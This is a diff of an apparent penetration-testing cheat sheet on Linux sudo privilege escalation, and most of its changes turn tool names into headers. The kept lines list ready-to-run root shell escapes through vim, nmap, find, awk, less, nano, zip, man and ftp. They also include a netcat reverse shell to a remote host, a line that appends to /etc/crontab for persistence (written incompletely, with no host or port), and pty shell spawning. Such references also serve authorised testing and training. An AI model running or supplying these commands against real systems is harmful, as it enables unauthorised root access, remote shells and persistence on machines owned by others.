@@ -191,7 +191,7 @@ GTFObins <li>https://gtfobins.github.io/</li>
 
 <b>hacked-account@victim~: </b><code>sudo bash -p</code>
 
-<h1>vim</h1>
+<h2>vim</h2>
 
 <b>hacked-account@victim~: </b><code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
 
@@ -199,48 +199,47 @@ GTFObins <li>https://gtfobins.github.io/</li>
 
 <b>hacked-account@victim~: </b><code>sudo nmap --interactive</code> followed by <code>!sh</code>
 
-iftop
+<h2>iftop</h2>
 
 <b>hacked-account@victim:~: </b><code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>
 
-find
+<h2>find</h2>
 
 <b>hacked-account@victim~: </b><code>sudo find . -exec /bin/sh \; -quit</code>
 
-
-nano
+<h2>nano</h2>
 
 <b>hacked-account@victim~: </b><code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
 
-man
+<h2>man</h2>
 
 <b>hacked-account@victim~: </b><code>sudo man man </code>followed by <code>!/bin/sh</code>
 
-awk
+<h2>awk</h2>
 
 <b>hacked-account@victim~: </b><code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
 
-less
+<h2>less</h2>
 
 <b>hacked-account@victim~: </b><code>sudo less /etc/profile followed by !/bin/sh</code>
 
 <b>hacked-account@victim~: </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
 
-ftp
+<h2>ftp</h2>
 
 <b>hacked-account@victim~: </b><code>sudo ftp</code>followed by <code>!/bin/sh</code>
 
-more
+<h2>more</h2>
 
 <b>hacked-account@victim~: </b><code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
 
-zip
+<h2>zip</h2>
 
 <b>hacked-account@victim~: </b><code>touch my-bum.txt</code>
 
 <b>hacked-account@victim~: </b><code>sudo zip my-bum.zip my-bum.txt -T --unzip-command="sh -c /bin/bash"</code>
 
-nc
+<h2>nc</h2>
 
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
@@ -255,14 +254,14 @@ Run
 <b>hacked-account@victim~: </b><code>sudo nc -e /bin/sh $RHOST $RPORT</code>
 
 
-Crontab
+<h2>Crontab</h2>
 
 Add to crontab to get root after 1 min 
 <b>hacked-account@victim~: </b><code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
 
 
-<h1>Spawn TTY shell / Stablelize your Shell</h1>
 
+<h1>Spawn TTY shell / Stablelize your Shell</h1>
 
 
 <b>hacked-account@victim~: </b><code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
